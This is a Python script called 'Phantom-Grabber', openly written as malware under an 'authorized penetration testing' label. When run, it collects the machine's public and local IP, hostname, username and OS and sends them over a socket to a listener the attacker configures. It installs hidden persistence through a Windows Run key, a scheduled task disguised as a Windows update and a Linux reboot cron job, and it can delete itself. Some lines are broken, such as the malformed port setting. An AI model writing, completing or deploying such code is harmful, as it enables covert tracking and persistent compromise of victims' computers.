#!/usr/bin/env python3
"""
Phantom-Grabber v1.0 — IPv4 Address Phoner
Authorized Penetration Testing Use Only

Single-file. No dependencies beyond Python stdlib.
On execution:
  1. Resolves own public IPv4 (api.ipify.org / fallback)
  2. Connects to hardcoded HOST:PORT
  3. Sends: PUBLIC_IP|HOSTNAME|USERNAME
  4. Optionally installs persistence
"""

import socket
import sys
import os
import platform
import subprocess
import time
import json
import urllib.request
import urllib.error
import getpass

# ================== CONFIG ==================
REMOTE_HOST = "Change_ME_MF"        #Your Listener IP
REMOTE_PORT = ::4444   (me also)            # Your listener port
USE_PERSISTENCE = True           # Install on startup
SELF_DELETE = False              # Delete self after execution
# ============================================

def get_public_ipv4() -> str:
    """Fetch public IPv4 address using multiple services."""
    services = [
        "https://api.ipify.org",
        "https://icanhazip.com",
        "https://checkip.amazonaws.com",
        "https://ifconfig.me/ip",
    ]
    for svc in services:
        try:
            req = urllib.request.Request(svc, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=5) as resp:
                ip = resp.read().decode("utf-8").strip()
                # Validate it's an IPv4 address
                parts = ip.split(".")
                if len(parts) == 4 and all(p.isdigit() and 0 <= int(p) <= 255 for p in parts):
                    return ip
        except Exception:
            continue
    return "0.0.0.0"

def get_local_ip() -> str:
    """Get local IP address."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "0.0.0.0"

def get_hostname() -> str:
    return socket.gethostname()

def get_username() -> str:
    return getpass.getuser()

def get_os_info() -> str:
    return f"{platform.system()} {platform.release()} {platform.machine()}"

def install_persistence():
    """Install startup persistence."""
    script_path = os.path.abspath(sys.argv[0])
    sysname = platform.system()
    
    try:
        if sysname == "Windows":
            import winreg
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                winreg.SetValueEx(regkey, "PhantomUpdater", 0, winreg.REG_SZ, f'"{sys.executable}" "{script_path}" --silent')
            # Also add scheduled task
            task_name = "WindowsUpdateTask_{}".format(int(time.time()) % 10000)
            subprocess.run(
                f'schtasks /create /tn "{task_name}" /tr "{sys.executable} \\"{script_path}\\" --silent" /sc MINUTE /mo 60 /f',
                shell=True, capture_output=True, timeout=10
            )
        elif sysname == "Linux":
            cron_line = f"@reboot {sys.executable} {script_path} --silent >/dev/null 2>&1\n"
            cron_file = os.path.expanduser("~/.config/cron/spy_cron")
            os.makedirs(os.path.dirname(cron_file), exist_ok=True)
            with open(cron_file, "w") as f:
                f.write(cron_line)
            subprocess.run(["crontab", cron_file], capture_output=True, timeout=10)
    except:
        pass

def phone_home(public_ip: str, local_ip: str, hostname: str, username: str, os_info: str):
    """Send data to remote listener."""
    payload = f"[PHANTOM] IP={public_ip}|LOCAL={local_ip}|HOST={hostname}|USER={username}|OS={os_info}"
    
    retries = 3
    for attempt in range(retries):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((REMOTE_HOST, REMOTE_PORT))
            sock.sendall(payload.encode("utf-8") + b"\n")
            # Wait briefly for acknowledgment
            try:
                ack = sock.recv(1024)
            except:
                pass
            sock.close()
            return True
        except Exception as e:
            if attempt < retries - 1:
                time.sleep(2 ** attempt)  # exponential backoff
            continue
    return False

def main():
    # Silent mode flag check
    silent = "--silent" in sys.argv
    
    if not silent:
        time.sleep(random.uniform(1, 5))  # slight delay to appear normal
    
    # Get data
    public_ip = get_public_ipv4()
    local_ip = get_local_ip()
    hostname = get_hostname()
    username = get_username()
    os_info = get_os_info()
    
    # Phone home
    success = phone_home(public_ip, local_ip, hostname, username, os_info)
    
    # Install persistence if enabled
    if USE_PERSISTENCE and not silent:
        install_persistence()
    
    # Self-delete if configured
    if SELF_DELETE and not silent:
        try:
            if platform.system() == "Windows":
                subprocess.Popen(
                    f'cmd /c timeout /t 2 /nobreak >nul & del "{os.path.abspath(sys.argv[0])}"',
                    shell=True, creationflags=subprocess.CREATE_NO_WINDOW
                )
            else:
                os.remove(sys.argv[0])
        except:
            pass

if __name__ == "__main__":
    # Anti-analysis: if running in VM/sandbox, exit silently
    try:
        import random
    except:
        random = None
    main()
